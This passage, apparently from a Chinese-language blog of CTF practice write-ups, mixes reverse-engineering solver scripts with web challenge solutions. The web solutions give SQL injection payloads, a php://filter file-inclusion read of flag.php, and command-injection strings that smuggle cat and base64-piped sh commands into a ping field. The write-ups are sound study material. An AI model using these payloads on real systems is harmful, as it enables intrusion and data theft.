class="number">0x0</span>&#125;;</span><br><span class="line">    cmpData[<span class="number">0</span>]-=<span class="number">10</span>;</span><br><span class="line">    cmpData[<span class="number">12</span>]=cmpData[<span class="number">2</span>]-cmpData[<span class="number">12</span>];</span><br><span class="line">    cmpData[<span class="number">11</span>]^=cmpData[<span class="number">12</span>];</span><br><span class="line">    cmpData[<span class="number">2</span>]-=<span class="number">7</span>;</span><br><span class="line">    cmpData[<span class="number">9</span>]=cmpData[<span class="number">8</span>]-cmpData[<span class="number">9</span>];</span><br><span class="line">    cmpData[<span class="number">8</span>]^=cmpData[<span class="number">7</span>];</span><br><span class="line">    cmpData[<span class="number">10</span>]=cmpData[<span class="number">7</span>]-cmpData[<span class="number">10</span>];</span><br><span class="line">    cmpData[<span class="number">7</span>]-=<span class="number">3</span>;</span><br><span class="line">    cmpData[<span class="number">3</span>]=cmpData[<span class="number">7</span>]-cmpData[<span class="number">3</span>];<span class="comment">//test</span></span><br><span class="line">    cmpData[<span class="number">15</span>]-=<span class="number">2</span>;</span><br><span class="line">    cmpData[<span class="number">14</span>]^=cmpData[<span class="number">15</span>];</span><br><span class="line">    cmpData[<span class="number">4</span>]^=cmpData[<span class="number">5</span>];</span><br><span class="line">    cmpData[<span class="number">6</span>]=cmpData[<span class="number">1</span>]-cmpData[<span class="number">6</span>];</span><br><span class="line">    cmpData[<span class="number">1</span>]^=cmpData[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        cmpData[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,cmpData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> s[] = <span class="string">&quot;1234567890123456&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        s[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;test&quot;</span>,s,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web-SUCTF-2019-EasySQL"><a href="#web-SUCTF-2019-EasySQL" class="headerlink" title="[web][SUCTF 2019]EasySQL"></a>[web][SUCTF 2019]EasySQL</h2><p>注入时发现三种情况</p>
<ol>
<li>单纯输入数字：输出固定值</li>
<li>加个引号导致语法错误：无输出</li>
<li>尝试注入1’ and 1=1 #：输出NoNoNo</li>
</ol>
<p>说明后端存在对于关键字的检测</p>
<p>可以直接使用fuzz字典+burpsuite测试后端过滤了哪些关键字。注意burp的线程不要太高，否则无法访问</p>
<p>公开代码可以看到关键查询语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $post[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
<p>要尝试让||不是逻辑或</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;</span><br></pre></td></tr></table></figure>
<p>这个模式下||就是管道模式，把前后查询的拼接在一起，而不是或运算符</p>
<p>payload为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>还有个解<em>,1，相当于select </em>,1</p>
<h2 id="rev-极客大挑战-2019-Secret-File"><a href="#rev-极客大挑战-2019-Secret-File" class="headerlink" title="[rev][极客大挑战 2019]Secret File"></a>[rev][极客大挑战 2019]Secret File</h2><ol>
<li>通过抓包抓到了secr3t.php</li>
<li>尝试了直接访问flag.php和文件包含flag.php都不行</li>
<li>原来不论文件包含还是直接访问，得到的都是flag.php执行之后的结果</li>
<li>通过php://filter获取文件结果<br>file=php://filter/convert.base64-encode/resource=flag.php</li>
<li>base64解码获得flag</li>
</ol>
<p>这里是php的文件包含漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;我就在这里&quot;</span>;</span><br><span class="line">                $flag = <span class="string">&#x27;flag&#123;49f63fd5-1b25-4904-9029-eb8dd71b352b&#125;&#x27;</span>;</span><br><span class="line">                $secret = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web-极客大挑战-2019-LoveSQL"><a href="#web-极客大挑战-2019-LoveSQL" class="headerlink" title="[web][极客大挑战 2019]LoveSQL"></a>[web][极客大挑战 2019]LoveSQL</h2><p>手工注入步骤</p>
<p>确认存在注入点<br>1’ or 1=1 #</p>
<p>1’ and 1=0 #</p>
<p>字段数<br>1’ union select 1,2,3 #</p>
<p>数据库名<br>1’ union select 1,2,database() #</p>
<p>表名<br>1’ union select 1,2,group_concat(table_name) from information_schema.columns where table_schema=database() #</p>
<p>这里有两张表geekuser l0ve1ysq1</p>
<p>列名<br>1’ union select 1,group_concat(column_name),2 from information_schema.columns where table_name=geekuser#</p>
<p>然后就可以找到flag</p>
<h2 id="web-护网杯-2018-easy-tornado"><a href="#web-护网杯-2018-easy-tornado" class="headerlink" title="[web][护网杯 2018]easy_tornado"></a>[web][护网杯 2018]easy_tornado</h2><p>访问hints.txt发现获取flag的方式，但是获取不到secret_cookie</p>
<ol>
<li>访问welcome.txt, 有个render，暗示使用python的render</li>
<li>可以报错注入，error?msg=</li>
<li>得到secret_cookie之后得到flag</li>
</ol>
<h2 id="web-GXYCTF2019-Ping-Ping-Ping"><a href="#web-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[web][GXYCTF2019]Ping Ping Ping"></a>[web][GXYCTF2019]Ping Ping Ping</h2><ol>
<li>ip=127.0.0.1 是ping命令</li>
<li>加||，空格会fuck your spaces</li>
<li>使用ip=127.0.0.1;ls 可以查看所有文件</li>
<li>看答案空格可以用$IFS$1代替</li>
<li>flag.php不让看，index.php可以查看</li>
<li>发现有个a变量，可以变量替换?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</li>
<li>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //通过base64</li>
<li>ip=127.0.0.1;cat$IFS$10<code>ls</code> // <code>ls</code>即取ls的结果</li>
</ol>
<h2 id="rev-SWPU2019-EasiestRe"><a href="#rev-SWPU2019-EasiestRe" class="headerlink" title="[rev][SWPU2019]EasiestRe"></a>[rev][SWPU2019]EasiestRe</h2><p>父子进程问题</p>
<ol>
<li>找到main函数</li>
<li>发现进行了fork，然后判断父子进程，子进程就输出，父进程等待调试事件</li>
<li>子进程求长度之后int3，父进程得到int3之后判断nop数量，然后写入内存</li>
<li>4个nop：直接继续执行<br>7个nop：写入v65<br>30个nop：写入v64</li>
<li>得到长度是0x18</li>
<li>通过SEH链实现验证逻辑</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v65 = [<span class="number">0x90</span>,<span class="number">0x83</span>,<span class="number">0x7d</span>,<span class="number">0xf8</span>,<span class="number">0x18</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>]</span><br><span class="line">addr = <span class="number">0x408af8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(addr,addr+<span class="number">7</span>):</span><br><span class="line">    patch_byte(i,v65[i-addr])</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v64 = [<span class="number">0x90</span>,<span class="number">0xF</span>,<span class="number">0xB6</span>,<span class="number">0x55</span>,<span class="number">0xF7</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">8</span>,<span class="number">0x8B</span>,<span class="number">4</span>,<span class="number">0x90</span>,<span class="number">0xF</span>,<span class="number">0xAF</span>,<span class="number">0x45</span>,<span class="number">0xFC</span>,<span class="number">0x33</span>,<span class="number">0xD2</span>,<span class="number">0xF7</span>,<span class="number">0x75</span>,<span class="number">0xF8</span>,<span class="number">0xF</span>,<span class="number">0xB6</span>,<span class="number">0x4D</span>,<span class="number">0xF7</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xC</span>,<span class="number">0x89</span>,<span class="number">0x14</span>,<span class="number">0x88</span>]</span><br><span class="line">addr = <span class="number">0x408824</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(addr,addr+<span class="number">30</span>):</span><br><span class="line">    patch_byte(i,v64[i-addr])</span><br></pre></td></tr></table></figure>
<p>好家伙一个小错误弄一个小时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int32_t</span> *a1,<span class="keyword">int32_t</span> *a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        a2[i]=a1[i]*<span class="number">41</span>%<span class="number">0x1eb</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int32_t</span> v10[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int32_t</span> v19[<span class="number">8</span>];</span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">check</span><span class="params">(<span class="keyword">uint8_t</span> f,<span class="keyword">int32_t</span> target)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int8_t</span> ch[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="number">1</span>&lt;&lt;i)&amp;f)&#123;</span><br><span class="line">            ch[i]=<span class="number">1</span>;</span><br><span class="line">            sum+=v19[<span class="number">7</span>-i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum==target)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    v10[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">    v10[<span class="number">2</span>] = <span class="number">7</span>;</span><br><span class="line">    v10[<span class="number">3</span>] = <span class="number">14</span>;</span><br><span class="line">    v10[<span class="number">4</span>] = <span class="number">30</span>;</span><br><span class="line">    v10[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">    v10[<span class="number">6</span>] = <span class="number">120</span>;</span><br><span class="line">    v10[<span class="number">7</span>] = <span class="number">251</span>;</span><br><span class="line">    init(v10,v19);</span><br><span class="line">    <span class="keyword">int32_t</span> v8[<span class="number">24</span>];</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">977</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">752</span>;</span><br><span class="line">    v8[<span class="number">2</span>] = <span class="number">82</span>;</span><br><span class="line">    v8[<span class="number">3</span>] = <span class="number">1141</span>;</span><br><span class="line">    v8[<span class="number">4</span>] = <span class="number">466</span>;</span><br><span class="line">    v8[<span class="number">5</span>] = <span class="number">752</span>;</span><br><span class="line">    v8[<span class="number">6</span>] = <span class="number">548</span>;</span><br><span class="line">    v8[<span class="number">7</span>] = <span class="number">1308</span>;</span><br><span class="line">    v8[<span class="number">8</span>] = <span class="number">1254</span>;</span><br><span class="line">    v8[<span class="number">9</span>] = <span class="number">671</span>;</span><br><span class="line">    v8[<span class="number">10</span>] = <span class="number">750</span>;</span><br><span class="line">    v8[<span class="number">11</span>] = <span class="number">923</span>;</span><br><span class="line">    v8[<span class="number">12</span>] = <span class="number">1017</span>;</span><br><span class="line">    v8[<span class="number">13</span>] = <span class="number">811</span>;</span><br><span class="line">    v8[<span class="number">14</span>] = <span class="number">754</span>;</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">1461</span>;</span><br><span class="line">    v8[<span class="number">16</span>] = <span class="number">588</span>;</span><br><span class="line">    v8[<span class="number">17</span>] = <span class="number">1114</span>;</span><br><span class="line">    v8[<span class="number">18</span>] = <span class="number">844</span>;</span><br><span class="line">    v8[<span class="number">19</span>] = <span class="number">1389</span>;</span><br><span class="line">    v8[<span class="number">20</span>] = <span class="number">10</span>;</span><br><span class="line">    v8[<span class="number">21</span>] = <span class="number">1254</span>;</span><br><span class="line">    v8[<span class="number">22</span>] = <span class="number">1142</span>;</span><br><span class="line">    v8[<span class="number">23</span>] = <span class="number">729</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int32_t</span> start =<span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int8_t</span> flag[<span class="number">25</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">uint8_t</span> j=<span class="number">0x20</span>;j&lt;<span class="number">0x7f</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">uint8_t</span> f;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                f=j^<span class="number">0x34</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                f=j^(v8[i<span class="number">-1</span>]&amp;<span class="number">0xFF</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(check(f,v8[i]))&#123;</span><br><span class="line">                flag[i]=j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">0x7e</span>)flag[i]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>,i,flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="misc-二维码"><a href="#misc-二维码" class="headerlink" title="[misc]二维码"></a>[misc]二维码</h2><ol>
<li><p>二维码图片，扫出来 secret is here</p>
</li>
<li><p>二进制查看，发现 number4.txt</p>
</li>
<li><p>binwalk走一波，出来个加密zip</p>
</li>
<li><p>看答案，原来number4暗示密码是4个数字，使用fcrackzip爆破</p>
<p>fcrackzip -b -c1 -l 4 文件名</p>
</li>
</ol>
<p>找到一堆可能的密码，7639是</p>
<h2 id="rev-NPUCTF2020-EzObfus-Chapter2"><a href="#rev-NPUCTF2020-EzObfus-Chapter2" class="headerlink" title="[rev][NPUCTF2020]EzObfus-Chapter2"></a>[rev][NPUCTF2020]EzObfus-Chapter2</h2><ol>
<li>里面有个很多层调用的函数</li>
<li>本来想用调试方法爆破，可是总是出个访存异常mmp</li>
<li>看答案，顺便学一下angr</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = Project(<span class="string">&#x27;./EzObfuse_Chapter2.exe&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x4164f8</span>)</span><br><span class="line">simfd = state.posix.get_fd(<span class="number">0</span>)</span><br><span class="line">data,real_size = simfd.read_data(<span class="number">22</span>)</span><br><span class="line">state.memory.store(<span class="number">0x42612c</span>,data)</span><br><span class="line">state.memory.store(<span class="number">0x426020</span>,data)</span><br><span class="line">simgr = p.factory.simulation_manager(state)</span><br><span class="line">simgr.one_active.options.add(options.LAZY_SOLVES)</span><br><span class="line">simgr.explore(find=<span class="number">0x416609</span>,avoid=<span class="number">0x4165ea</span>)</span><br><span class="line"></span><br><span class="line">print(simgr.one_found.solver.eval(simgr.one_found.memory.load(<span class="number">0x0042612C</span>,<span class="number">22</span>),cast_to = bytes))</span><br></pre></td></tr></table></figure>
<p>这道题也可以用qiling框架做，debug也可以，改天再试试</p>
<h2 id="rev-RCTF2019-DontEatMe"><a href="#rev-RCTF2019-DontEatMe" class="headerlink" title="[rev][RCTF2019]DontEatMe"></a>[rev][RCTF2019]DontEatMe</h2><p>迷宫问题</p>
<ol>
<li>使用固定种子随机生成迷宫</li>
<li>对用户输入做一些变换，作为步输入进迷宫</li>
<li>通过debug打印迷宫</li>
<li>起点为5,10</li>
<li>最终需要所处的点为0最终位于9,4，总步数不超过17，大概就是中间那条线</li>
</ol>
<p>对于输入的变换</p>
<ol>
<li>base16解码</li>
<li>对于每解码后的每8个Byte，分成两组4Byte，每个byte16轮变换，中间两个常量通过debug得到</li>
<li>调试器可以更改数据显示类型以更好地复制</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print maze</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span 